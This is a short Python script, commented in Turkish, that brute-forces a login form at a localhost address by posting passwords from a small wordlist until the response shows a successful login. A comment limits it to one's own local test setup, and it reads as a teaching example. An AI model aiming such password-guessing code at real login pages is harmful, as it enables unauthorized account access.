import requests

# Sadece kendi yerel test ortamınızdaki bir adres olmalıdır
url = "http://127.0.0.1:8000/login"
wordlist = ["123456", "password", "admin123", "gizli sifre"]

for password in wordlist:
  # Gönderilecek form verileri
  payload = {"username": "test_user", "password": password}

  # Sunucuya istek gönderme
  response = requests.post(url, data=payload)

  # Sunucudan dönen cevaba göre kontrol
  if "Giriş Başarılı" in response.text:
    print(f"[+] Şifre Bulundu: {password}")
    break
  else:
    print(f"[-] Deneniyor: {password} - Başarısız")

